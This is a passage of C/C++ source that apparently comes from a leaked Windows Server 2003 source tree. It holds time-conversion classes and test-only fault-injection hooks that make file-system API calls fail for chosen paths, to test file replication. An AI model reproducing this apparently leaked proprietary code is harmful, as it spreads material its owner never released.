CMTimeSpan& CMTimeSpan::operator+=(const CMTimeSpan& span)
{
    m_TimeSpan += span.m_TimeSpan;
    return *this;
}

CMTimeSpan& CMTimeSpan::operator-=(const CMTimeSpan& span)
{
    m_TimeSpan -= span.m_TimeSpan;
    return *this;
}

CMTimeSpan CMTimeSpan::operator+(const CMTimeSpan& span) const
{
    return CMTimeSpan(m_TimeSpan + span.m_TimeSpan);
}

CMTimeSpan CMTimeSpan::operator-(const CMTimeSpan& span) const
{
    return CMTimeSpan(m_TimeSpan - span.m_TimeSpan);
}

// Boolean Operators (NOTE: no overflow check)

bool CMTimeSpan::operator==(const CMTimeSpan& time) const
{
    return (m_TimeSpan == time.m_TimeSpan);
}

bool CMTimeSpan::operator!=(const CMTimeSpan& time) const
{
    return (m_TimeSpan != time.m_TimeSpan);
}

bool CMTimeSpan::operator<(const CMTimeSpan& time) const
{
    return (m_TimeSpan < time.m_TimeSpan);
}

bool CMTimeSpan::operator>(const CMTimeSpan& time) const
{
    return (m_TimeSpan > time.m_TimeSpan);
}

bool CMTimeSpan::operator<=(const CMTimeSpan& time) const
{
    return (m_TimeSpan <= time.m_TimeSpan);
}

bool CMTimeSpan::operator>=(const CMTimeSpan& time) const
{
    return (m_TimeSpan >= time.m_TimeSpan);
}



// ----------------------------------------------------------------------------
// CMTime

// Constructors

CMTime::CMTime():m_Time(0)
{
}

CMTime::CMTime(const CMTime& time):m_Time(time.m_Time)
{
}

CMTime::CMTime(const FILETIME& ft)
{
    ULARGE_INTEGER large;
    large.LowPart = ft.dwLowDateTime;
    large.HighPart = ft.dwHighDateTime;
    m_Time = large.QuadPart;
}

CMTime::CMTime(const SYSTEMTIME& st)
{
    FILETIME ft;
    if (!SystemTimeToFileTime(&st, &ft)) {
        throw WIN32_ERROR(GetLastError(), "SystemTimeToFileTime");
    }
    *this = CMTime(ft);
}

CMTime::CMTime(const WORD& Year,
               const WORD& Month,
               const WORD& Day,
               const WORD& Hour,
               const WORD& Minute,
               const WORD& Second,
               const WORD& Milliseconds)
{
    SYSTEMTIME st;
    st.wYear = Year;
    st.wMonth = Month;
    st.wDay = Day;
    st.wHour = Hour;
    st.wMinute = Minute;
    st.wSecond = Second;
    st.wMilliseconds = Milliseconds;
    *this = CMTime(st);
}

CMTime::CMTime(const ULARGE_INTEGER& t):m_Time(t.QuadPart)
{
}

CMTime::CMTime(const ULONGLONG& t):m_Time(t)
{
}

// Extractors

ULONGLONG CMTime::GetTime() const
{
    return m_Time;
}

FILETIME CMTime::GetFileTime() const
{
    ULARGE_INTEGER large;
    large.QuadPart = m_Time;

    FILETIME ft;
    ft.dwLowDateTime = large.LowPart;
    ft.dwHighDateTime = large.HighPart;
    return ft;
}

// Arithmetic Operators (NOTE: no overflow check)

CMTime& CMTime::operator+=(const CMTimeSpan& span)
{
    m_Time += span.TotalHns();
    return *this;
}

CMTime& CMTime::operator-=(const CMTimeSpan& span)
{
    m_Time -= span.TotalHns();
    return *this;
}

CMTime CMTime::operator+(const CMTimeSpan& span) const
{
    return CMTime(m_Time + span.TotalHns());
}

CMTime CMTime::operator-(const CMTimeSpan& span) const
{
    return CMTime(m_Time - span.TotalHns());
}

CMTimeSpan CMTime::operator-(const CMTime& time) const
{
    return CMTimeSpan(m_Time - time.m_Time);
}

// Boolean Operators

bool CMTime::operator==(const CMTime& time) const
{
    return (m_Time == time.m_Time);
}

bool CMTime::operator!=(const CMTime& time) const
{
    return (m_Time != time.m_Time);
}

bool CMTime::operator<(const CMTime& time) const
{
    return (m_Time < time.m_Time);
}

bool CMTime::operator>(const CMTime& time) const
{
    return (m_Time > time.m_Time);
}

bool CMTime::operator<=(const CMTime& time) const
{
    return (m_Time <= time.m_Time);
}

bool CMTime::operator>=(const CMTime& time) const
{
    return (m_Time >= time.m_Time);
}

#if 0
// Friend Operators

CMTime
operator+(const FILETIME& t1, const CMTime& t2)
{
    CMTime result = t1;
    result += t2.m_Time;
    return result;
}

CMTime
operator+(const ULARGE_INTEGER& t1, const CMTime& t2)
{
    CMTime result = t1;
    result += t2.m_Time;
    return result;
}

CMTime
operator+(const LARGE_INTEGER& t1, const CMTime& t2)
{
    CMTime result = t1;
    result += t2.m_Time;
    return result;
}

CMTime
operator+(const ULONGLONG& t1, const CMTime& t2)
{
    CMTime result = t1;
    result += t2.m_Time;
    return result;
}

CMTime
operator+(const LONGLONG& t1, const CMTime& t2)
{
    CMTime result = t1;
    result += t2.m_Time;
    return result;
}
#endif

string
CMTime::TimeString(
    ) const
{
    FILETIME ft = GetFileTime();
    SYSTEMTIME st;
    if (!FileTimeToSystemTime(&ft, &st))
        throw WIN32_ERROR(GetLastError(), "FileTimeToSystemTime");

    stringstream s;
    s << setfill('0') << st.wYear << "-"
      << setw(2) << st.wMonth << "-" << setw(2) << st.wDay << "T"
      << setw(2) << st.wHour << ":" << setw(2) << st.wMinute << ":"
      << setw(2) << st.wSecond;
    if (st.wMilliseconds)
        s << "." << setw(3) << st.wMilliseconds;
    return s.str();
}



// ----------------------------------------------------------------------------
// CTimeConverter
//
//   Notation:
//
//     T  = A Time in UTC at the control node (CMTime)
//     R  = Relative Time (CMTimeSpan)
//     T' = Time in the control node's time zone (TZ) (CMTime)
//     t  = Time in local ticks (CTicks / CMTimeSpan)
//
//   We contact the control node to get:
//
//     T_c = Some arbitrary time at control
//     t_c = The local ticks corresponding to T_c
//     S_c = UTC bias for control
//
//   To convert a time in control's TZ to a UTC time:
//
//     T(T') = T' + S_c
//
//   To compute a time in local ticks from a time in control's time:
//
//     t(T)     = T - T_c + t_c
//     t(T(T')) = (T' + S_c) - T_c + t_c
//
//   Given:
//
//     T_s' = Scenario Start Time (specified in control's TZ)
//     R_e  = Some event time
//
//   We can compute the amount of time to wait for an event (in local ticks)
//
//     W(R_e) = t_s + R_e - t_NOW
//
//   Where:
//
//     t_s   = scenario start in local ticks
//     t_NOW = the current local ticks
//
//   So we compute t_s:
//
//     t_s = t(T_s)
//         = t(T(T_s'))
//         = (T_s' + S_c) - T_c + t_c
//
//   Ok, we now have everything for computing the wait time:
//
//     W(R_e) = t_s + R_e - t_NOW
//            = ( (T_s' + S_c) - T_c + t_c ) + R_e - t_NOW

// 5 seconds error threshold
const CTicks CTimeConverter::ERROR_THRESHOLD(5 * CTicks::Second);

CTimeConverter::CTimeConverter(_bstr_t Control, CMTime StartTime):
    m_Control(Control),
    m_StartTimeAtControl(StartTime),
    m_bInit(false),
    m_bInitError(false)
{
}

CTimeConverter::~CTimeConverter()
{
}

bool
CTimeConverter::Init()
{
    if (m_bInit || m_bInitError)
        return !m_bInitError;

    LPTIME_OF_DAY_INFO pTOD = NULL;
    NET_API_STATUS nStatus;

    CTicks StartTicks;
    CTicks StopTicks;
    CTicks DeltaTicks;

    try {

        //
        // Get the remote time and figure how long that took
        //

        // Start timing
        StartTicks = Global.pTicker->GetTicks();
        // Retrieve the remote time as UTC
        nStatus = NetRemoteTOD(static_cast<LPCWSTR>(m_Control),
                               reinterpret_cast<LPBYTE *>(&pTOD));
        // Stop timing
        StopTicks = Global.pTicker->GetTicks();
        // Compute elapsed time
        DeltaTicks = StopTicks - StartTicks;

        stringstream call;
        call << "NetRemoteTOD(" << m_Control << ")";

        //
        // Check for errors
        //

        if (nStatus != NERR_Success) {
            throw WIN32_ERROR(nStatus, call.str());
        }
        if (pTOD == NULL) {
            stringstream s;
            s << "no buffer returned by " << call.str();
            throw s.str();
        }
        if (DeltaTicks > CTimeConverter::ERROR_THRESHOLD) {
            stringstream s;
            s << "Getting the time from server \"" << m_Control
              << "\" took more than "
              << ( CTimeConverter::ERROR_THRESHOLD.TotalHns() /
                   CMTimeSpan::Millisecond )
              << " milliseconds";
            throw s.str();
        }
        // verify that TZ info is present
        if (pTOD->tod_timezone == -1) {
            stringstream s;
            s << "Cannot figure out TZ for server \"" << m_Control << "\"";
            throw s.str();
        }


        //
        // Convert the Data
        //

        m_ControlTimeLocalTicks = StopTicks;
        m_ControlTimeUtc = CMTime(static_cast<WORD>(pTOD->tod_year),
                                  static_cast<WORD>(pTOD->tod_month),
                                  static_cast<WORD>(pTOD->tod_day),
                                  static_cast<WORD>(pTOD->tod_hours),
                                  static_cast<WORD>(pTOD->tod_mins),
                                  static_cast<WORD>(pTOD->tod_secs),
                                  static_cast<WORD>(pTOD->tod_hunds) * 10);
        m_ControlTimeUtcBias =
            CMTimeSpan(pTOD->tod_timezone * CMTimeSpan::Minute);

        // t_s = t(T_s) = t(T(T_s'))
        m_StartTimeLocalTicks =
            _UtcToTicks(_ControlToUtc(m_StartTimeAtControl));

        m_bInit = true;

        //
        // Just For Fun Output
        //

        time_t t = pTOD->tod_elapsedt;
        string s = ctime(&t);
        // remote trailing '\n'
        s.erase(s.length() - 1, 1);

        CMTimeSpan uptime(0, 0, 0, 0, pTOD->tod_msecs);
        CMTimeSpan resolution(pTOD->tod_tinterval);

        stringstream temp_s;
        temp_s << endl
               << "Control Server:   " << m_Control << endl
               << "Control Time:     " << m_ControlTimeUtc.TimeString() << endl
               << "Control UTC Bias: "
               << ( static_cast<double>(m_ControlTimeUtcBias.TotalHns()) /
                    CMTimeSpan::Hour ) << " hours" << endl
               << "-----" << endl
               << "Control Time (elapsedt): " << s << endl
               << "Control Up Time: "
               << uptime.Format("%d days %h hours %m mins %s.%L secs") << endl
               << "Control Timer Resolution: "
               << ( static_cast<double>(resolution.TotalHns()) /
                    CMTimeSpan::Microsecond ) << endl
               << "Called into NetRemoteTOD: "
               << StartTicks.TotalHns() / CTicks::Millisecond
               << " ms on local ticker" << endl
               << "Return from NetRemoteTOD: "
               << StopTicks.TotalHns() / CTicks::Millisecond
               << " ms on local ticker" << endl
               << "NetRemoteTOD Elapsed Time: "
               << DeltaTicks.TotalHns() / CTicks::Millisecond
               << " ms" << endl
               << endl;
        MiF_TRACE(MiF_INFO, "%s", temp_s.str().c_str());
    }
    catch (...) {
        m_bInitError = true;

        if (pTOD)
            NetApiBufferFree(pTOD);

        throw;
    }

    m_bInit = true;

    if (pTOD)
        NetApiBufferFree(pTOD);

    return true;
}

CMTime
CTimeConverter::_ControlToUtc(const CMTime& TimeAtControl) const
{
    // m_ControlTimeUtcBias better have been set!
    // T(T') = T' + S_c
    return TimeAtControl + m_ControlTimeUtcBias;
}

CTicks
CTimeConverter::_UtcToTicks(const CMTime& TimeUtc) const
{
    MiF_ASSERT(m_ControlTimeUtc != 0);
    MiF_ASSERT(m_ControlTimeLocalTicks != 0);
    // t(T) = T - T_c + t_c
    return TimeUtc - m_ControlTimeUtc + m_ControlTimeLocalTicks;
}

CTicks
CTimeConverter::TicksFromNow(
    const CMTimeSpan& EventTime
    ) const
{
    if (!m_bInit)
        throw "Tried to use uninitialized time converter object";
    // W(R_e) = t_s + R_e - t_NOW
    return m_StartTimeLocalTicks + EventTime - Global.pTicker->GetTicks();
}

CTicks
CTimeConverter::TicksFromThen(
    const CMTimeSpan& EventTime,
    const CTicks& ThenTicks
    ) const
{
    if (!m_bInit)
        throw "Tried to use uninitialized time converter object";
    // W(R_e) = t_s + R_e - t_THEN
    return m_StartTimeLocalTicks + EventTime - ThenTicks;
}


// ----------------------------------------------------------------------------
// FILETIME Utility Functions and Operators

ULARGE_INTEGER
FileTimeToULargeInteger(
    const FILETIME& ft
    )
{
    ULARGE_INTEGER u;
    u.LowPart = ft.dwLowDateTime;
    u.HighPart = ft.dwHighDateTime;
    return u;
}


FILETIME
ULargeIntegerToFileTime(
    const ULARGE_INTEGER& u
    )
{
    FILETIME ft;
    ft.dwLowDateTime = u.LowPart;
    ft.dwHighDateTime = u.HighPart;
    return ft;
}


FILETIME
operator +(
    const FILETIME& ftStart,
    const FILETIME& ftDuration
    )
{
    ULARGE_INTEGER uStart = FileTimeToULargeInteger(ftStart);
    ULARGE_INTEGER uDuration = FileTimeToULargeInteger(ftDuration);

    ULARGE_INTEGER uResult;
    uResult.QuadPart = uStart.QuadPart + uDuration.QuadPart;

    return ULargeIntegerToFileTime(uResult);
}



// ----------------------------------------------------------------------------
// Streaming _bstr_t and 64-bit integers

ostream& operator<<(ostream& os, const _bstr_t& s)
{
    os << (char*)s;
    return os;
}


ostream&
operator<<(ostream& os, const __int64& i)
{
    os << int64_to_string(i);
    return os;
}


ostream&
operator<<(ostream& os, const unsigned __int64& i)
{
    os << uint64_to_string(i);
    return os;
}



// ----------------------------------------------------------------------------
// int64_to_string

static
string
_int64_to_string(
    bool _signed,
    __int64 i,
    ios_base::fmtflags flags
    )
{
    char buffer[22];
    char* fmt = NULL;

    if (flags & ios_base::dec)
        fmt = "%I64d";
    else if (flags & ios_base::oct)
        fmt = "%I64o";
    else if (flags & ios_base::hex) {
        if (flags & ios_base::uppercase)
            fmt = "%I64X";
        else
            fmt = "%I64x";
    }
    _snprintf(buffer, sizeof(buffer), fmt, i);
    buffer[sizeof(buffer)-1] = 0;
    return buffer;
}


string
int64_to_string(
    __int64 i,
    ios_base::fmtflags flags
    )
{
    return _int64_to_string(true, i, flags);
}


string
uint64_to_string(
    unsigned __int64 i,
    ios_base::fmtflags flags
    )
{
    return _int64_to_string(false, i, flags);
}



// ----------------------------------------------------------------------------
// SetWaitableTimer

BOOL
SetWaitableTimer(
    HANDLE hTimer,
    const CTicks& ticks,
    PTIMERAPCROUTINE pfnCompletionRoutine,
    LPVOID lpArgToCompletionRoutine
    )
{
    LONGLONG DueTime = ticks.TotalHns();
    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = (DueTime > 0) ? (-DueTime) : 0;

    return SetWaitableTimer(hTimer,   // handle to timer
                            &liDueTime, // timer due time
                            0,        // timer interval
                            pfnCompletionRoutine,     // completion routine
                            lpArgToCompletionRoutine, // completion routine arg
                            FALSE);                   // resume state
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\driver\src\main.c ===
#include <mifault_test.h>
#include <stdio.h>

int
__cdecl
test_main(
    int argc,
    char* argv[]
    )
{
    int i;
    printf("This is test_main():\n");
    for (i = 0; i < argc; i++) {
        printf("argv[%d] = %s\n", i, argv[i]);
    }
    return 31;
}


void
test_publish(
    )
{
    printf("Published\n");
}


int
__cdecl
main(
    int argc,
    char *argv[]
    )
{
    int i;
    // Try calling MiFaultLibStartup()
    test_publish();
    i = test_main(argc, argv);
    printf("result = %d\n", i);
    return MiFaultLibTestA(argc, argv);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\frs\fault\fault.cxx ===
#include "pch.hxx"


I_Lib* g_pLib = 0;


bool
WINAPI
MiFaultFunctionsStartup(
    const char* version,
    I_Lib* pLib
    )
{
    if (strcmp(version, MIFAULT_VERSION))
        return false;
    g_pLib = pLib;
    return true;
}


void
WINAPI
MiFaultFunctionsShutdown(
    )
{
    g_pLib = 0;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\driver\fault\fault.cxx ===
#include <iostream>
#include <sstream>
#include <mifault.h>

#include <InjRT.h>

using namespace std;
using namespace MiFaultLib;

I_Lib* g_pLib = 0;

#define FF_TRACE g_pLib->Trace

void
PrintArgs(
    ostream& os,
    I_Args* pArgs
    )
{
    const size_t count = pArgs->GetCount();
    for (size_t i = 0; i < count; i++) {
        Arg arg = pArgs->GetArg(i);
        os << "ARGUMENT: "
          << (arg.Name ? ( arg.Name[0] ? arg.Name : "(BLANK)") : "(NULL)")
          << " = " << arg.Value << endl;
    }
}

int __cdecl hello_world(int argc, char* argv[])
{
    I_Trigger* pTrigger = g_pLib->GetTrigger();
    I_Args* pArgs = 0;

    stringstream os;
    os << "--- TRIGGER INFO ---" << endl
       << "Group Name: " << pTrigger->GetGroupName() << endl
       << "Tag Name: " << pTrigger->GetTagName() << endl
       << "Function Name: " << pTrigger->GetFunctionName() << endl
       << "Function Index: " << pTrigger->GetFunctionIndex() << endl
       << endl;

    os << "--- FUNCTION ARGS ---" << endl;
    pArgs = pTrigger->GetFunctionArgs();
    PrintArgs(os, pArgs);
    pArgs->Done();
    os << endl;

    os << "--- GROUP ARGS ---" << endl;
    pArgs = pTrigger->GetGroupArgs();
    PrintArgs(os, pArgs);
    pArgs->Done();
    FF_TRACE(MiFF_INFO, "%s", os.str().c_str());

    pTrigger->Done();

    cerr << "HELLO WORLD" << endl;

    int retval = 0;

    typedef int (__cdecl *FP)(int, char**);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    if (pfn) {
        FF_TRACE(MiFF_INFO, "Invoking original function");
        retval = pfn(argc, argv);
    } else {
        FF_TRACE(MiFF_FATAL, "Could not find original function!!");
        abort();
    }

    typedef void (__stdcall *FP2)();

    FP2 pfn2 = reinterpret_cast<FP2>(g_pLib->GetPublishedFunctionAddress(
                                         "test_publish"));
    if (pfn2) {
        FF_TRACE(MiFF_INFO, "Invoking test_publish()");
        pfn2();
    } else {
        FF_TRACE(MiFF_FATAL, "Could not find test_publish()!");
        abort();
    }

    return retval;
}

bool
WINAPI
MiFaultFunctionsStartup(
    const char* version,
    I_Lib* pLib
    )
{
    if (strcmp(version, MIFAULT_VERSION))
        return false;
    g_pLib = pLib;
    return true;
}

void
WINAPI
MiFaultFunctionsShutdown(
    )
{
    g_pLib = 0;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\frs\fault\diskoperror.cxx ===
#include "pch.hxx"


inline
_bstr_t
UnicodeStringToBStrT(
    IN PUNICODE_STRING UnicodeString
    )
{
    USHORT Count = UnicodeString->Length / sizeof(WCHAR);
    USHORT MaxCount = UnicodeString->MaximumLength / sizeof(WCHAR);

    if ((MaxCount > Count) && (0 == UnicodeString->Buffer[Count])) {
        return _bstr_t(UnicodeString->Buffer);
    }

    PWCHAR Buffer = new WCHAR[Count + 1];
    memcpy(Buffer, UnicodeString->Buffer, sizeof(WCHAR) * Count);
    Buffer[Count] = 0;

    _bstr_t Result(Buffer);
    delete [] Buffer;

    return Result;
}


struct ARGS_G_DiskOpError
{
    typedef ARGS_G_DiskOpError self_t;

    DWORD Error;
    vector<_bstr_t> Paths;

    static self_t* Get(I_Lib* pLib)
    {
        I_Args* pArgs = pLib->GetTrigger()->GetGroupArgs();
        self_t* pParsedArgs = reinterpret_cast<self_t*>(pArgs->GetParsedArgs());
        if (!pParsedArgs)
        {
            const size_t count = pArgs->GetCount();
            FF_ASSERT(count >= 2);

            pParsedArgs = new self_t;

            Arg arg = pArgs->GetArg(0);
            pParsedArgs->Error = atoi(arg.Value);

            for (size_t i = 1; i < count; i++)
            {
                Arg arg = pArgs->GetArg(i);
                pParsedArgs->Paths.push_back(arg.Value);
            }
            if (!pArgs->SetParsedArgs(pParsedArgs, Cleanup))
            {
                // someone else set the args while we were building the args
                delete pParsedArgs;
                pParsedArgs = reinterpret_cast<self_t*>(pArgs->GetParsedArgs());
                FF_ASSERT(pParsedArgs);
            }
        }
        return pParsedArgs;
    };
    static void Cleanup(void* _p)
    {
        self_t* pParsedArgs = reinterpret_cast<self_t*>(_p);
        delete pParsedArgs;
    };
};


inline
bool
MatchFile(
    const _bstr_t& FileName,
    const _bstr_t& Path
    )
{
    // ISSUE-2002/07/26-daniloa -- May need fancier matching
    return StrStrIW(static_cast<const wchar_t*>(FileName),
                    static_cast<const wchar_t*>(Path)) != NULL;
}


inline
bool
ShouldInterceptFile(
    IN  const _bstr_t FileName,
    OUT DWORD& Error
    )
{
    typedef ARGS_G_DiskOpError g_args_t;
    g_args_t* pGroupArgs = g_args_t::Get(g_pLib);

    for (int i = 0; i < pGroupArgs->Paths.size(); i++) {
        const _bstr_t& Path = pGroupArgs->Paths[i];
        if (MatchFile(FileName, Path)) {
            Error = pGroupArgs->Error;
            return true;
        }
    }

    return false;
}


int
__stdcall
FF_DeleteFileW_G_DiskOpError(
    unsigned short const* lpFileName
    )
{
    FF_TRACE(MiFF_INFO, "DeleteFileW(%S)", lpFileName);

    DWORD Error;
    if (ShouldInterceptFile(lpFileName, OUT Error)) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 lpFileName, Error);
        return Error;
    }

    typedef int (__stdcall *FP)(unsigned short const*);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(lpFileName);
}


int
__stdcall
FF_MoveFileExW_G_DiskOpError(
    unsigned short const* lpExistingFileName,
    unsigned short const* lpNewFileName,
    unsigned long dwFlags
    )
{
    FF_TRACE(MiFF_INFO, "MoveFileExW(%S, %S, 0x%08X)", lpExistingFileName,
             lpNewFileName, dwFlags);

    DWORD Error;
    if (ShouldInterceptFile(lpExistingFileName, OUT Error)) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 lpExistingFileName, Error);
        return Error;
    }
    if (ShouldInterceptFile(lpNewFileName, OUT Error)) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 lpNewFileName, Error);
        return Error;
    }

    typedef int (__stdcall *FP)(unsigned short const*,unsigned short const*,unsigned long);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(lpExistingFileName, lpNewFileName, dwFlags);
}


int
__stdcall
FF_CopyFileExW_G_DiskOpError(
    unsigned short const* lpExistingFileName,
    unsigned short const* lpNewFileName,
    void* lpProgressRoutine,
    void* lpData,int* pbCancel,
    unsigned long dwCopyFlags
    )
{
    FF_TRACE(MiFF_INFO, "CopyFileExW(%S, %S, ..., 0x%08X)", lpExistingFileName,
             lpNewFileName, dwCopyFlags);

    DWORD Error;
    if (ShouldInterceptFile(lpExistingFileName, OUT Error)) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 lpExistingFileName, Error);
        return Error;
    }
    if (ShouldInterceptFile(lpNewFileName, OUT Error)) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 lpNewFileName, Error);
        return Error;
    }

    typedef int (__stdcall *FP)(unsigned short const*,unsigned short const*,void*,void*,int*,unsigned long);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(lpExistingFileName, lpNewFileName, lpProgressRoutine, lpData, pbCancel, dwCopyFlags);
}


void*
__stdcall
FF_CreateFileW_G_DiskOpError(
    unsigned short const* lpFileName,
    unsigned long dwDesiredAccess,
    unsigned long dwShareMode,
    _SECURITY_ATTRIBUTES* lpSecurityAttributes,
    unsigned long dwCreationDisposition,
    unsigned long dwFlagsAndAttributes,
    void* hTemplateFile
    )
{
    FF_TRACE(MiFF_INFO, "CreateFileW(%S, 0x%08X, 0x%08X, 0x%08X, 0x%08X)",
             lpFileName, dwDesiredAccess, dwShareMode, dwCreationDisposition,
             dwFlagsAndAttributes);

    DWORD Error;
    if (ShouldInterceptFile(lpFileName, OUT Error)) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 lpFileName, Error);
        SetLastError(Error);
        return INVALID_HANDLE_VALUE;
    }

    typedef void* (__stdcall *FP)(unsigned short const*,unsigned long,unsigned long,_SECURITY_ATTRIBUTES*,unsigned long,unsigned long,void*);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}


unsigned long
__stdcall
FF_OpenEncryptedFileRawW_G_DiskOpError(
    unsigned short const* lpFileName,
    unsigned long Flags,
    void** Context
    )
{
    FF_TRACE(MiFF_INFO, "OpenEncryptedFileRawW(%S, 0x%08X, ...)",
             lpFileName, Flags);

    DWORD Error;
    if (ShouldInterceptFile(lpFileName, OUT Error)) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 lpFileName, Error);
        return Error;
    }

    typedef unsigned long (__stdcall *FP)(unsigned short const*,unsigned long,void**);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(lpFileName, Flags, Context);
}


// typedef struct _OBJECT_ATTRIBUTES {
//     ULONG Length;
//     HANDLE RootDirectory;
//     PUNICODE_STRING ObjectName;
//     ULONG Attributes;
//     PVOID SecurityDescriptor;
//     PVOID SecurityQualityOfService;
// } OBJECT_ATTRIBUTES;


NTSTATUS
NTAPI
FF_NtCreateFile_G_DiskOpError(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength
    )
{
    FF_TRACE(MiFF_INFO,
             "NtCreateFile(0x%08X, 0x%08X, %.*S, 0x%08X, 0x%08X, 0x%08X, 0x%08X, 0x%08X)",
             DesiredAccess,
             ObjectAttributes->RootDirectory,
             ObjectAttributes->ObjectName->Length / sizeof(WCHAR),
             ObjectAttributes->ObjectName->Buffer,
             ObjectAttributes->Attributes,
             FileAttributes,
             ShareAccess,
             CreateDisposition,
             CreateOptions
             );

    DWORD Error;
    // ISSUE-2002/07/26-daniloa -- Need to use the root handle
    _bstr_t FileName = UnicodeStringToBStrT(ObjectAttributes->ObjectName);
    if (ShouldInterceptFile(FileName, OUT Error)) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 static_cast<const char*>(FileName), Error);
        return Error;
    }

    typedef NTSTATUS (NTAPI *FP)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}


NTSTATUS
NTAPI
FF_NtOpenFile_G_DiskOpError(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG ShareAccess,
    IN ULONG OpenOptions
    )
{
    FF_TRACE(MiFF_INFO,
             "NtOpenFile(0x%08X, 0x%08X, %.*S, 0x%08X, 0x%08X, 0x%08X)",
             DesiredAccess,
             ObjectAttributes->RootDirectory,
             ObjectAttributes->ObjectName->Length / sizeof(WCHAR),
             ObjectAttributes->ObjectName->Buffer,
             ObjectAttributes->Attributes,
             ShareAccess,
             OpenOptions
             );

    DWORD Error;
    // ISSUE-2002/07/26-daniloa -- Need to use the root handle
    _bstr_t FileName = UnicodeStringToBStrT(ObjectAttributes->ObjectName);
    if (ShouldInterceptFile(FileName, OUT Error)) {
        FF_TRACE(MiFF_INFO, "Intercepted (%S) --> Returning error: %u",
                 static_cast<const char*>(FileName), Error);
        return Error;
    }

    typedef NTSTATUS (NTAPI *FP)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);

    FP pfn = reinterpret_cast<FP>(g_pLib->GetOriginalFunctionAddress());
    FF_ASSERT(pfn);
    FF_TRACE(MiFF_INFO, "Invoking original function");
    return pfn(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\frs\inc\ntfrs.h ===
#pragma once

extern "C" {
#include <ntreppch.h>
#include <frs.h>
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\frs\fault\util.cxx ===
#include "pch.hxx"

#define WIN32_DEVICE_PREFIX L"\\\\.\\"
#define WIN32_DEVICE_PREFIX_COUNT \
    (sizeof(WIN32_DEVICE_PREFIX) / sizeof(WCHAR) - 1)
#define WIN32_ESCAPE_PREFIX L"\\\\?\\"
#define WIN32_ESCAPE_PREFIX_COUNT \
    (sizeof(WIN32_ESCAPE_PREFIX) / sizeof(WCHAR) - 1)
#define WIN32_UNC_ADD L"?\\UNC\\"
#define WIN32_UNC_ADD_COUNT \
    (sizeof(WIN32_UNC_ADD) / sizeof(WCHAR) - 1)



PVOID
FfAlloc(
    SIZE_T Size
    )
{
    PVOID Buffer = LocalAlloc(0, Size);
    FF_ASSERT(Buffer);
    return Buffer;
}


BOOL
FfFree(
    PVOID Buffer
    )
{
    return (LocalFree(Buffer) == NULL);
}


PWCHAR
FfWcsDup(
    PWCHAR OldStr
    )
/*++
Routine Description:

    Duplicate a string using FfAlloc().

Arguments:

    OldStr  - string to duplicate

Return Value:

    Duplicated string. Free with FfFree().

--*/
{
    PWCHAR  NewStr;

    //
    // E.g., when duplicating NodePartner when none exists
    //
    if (OldStr == NULL) {
        return NULL;
    }

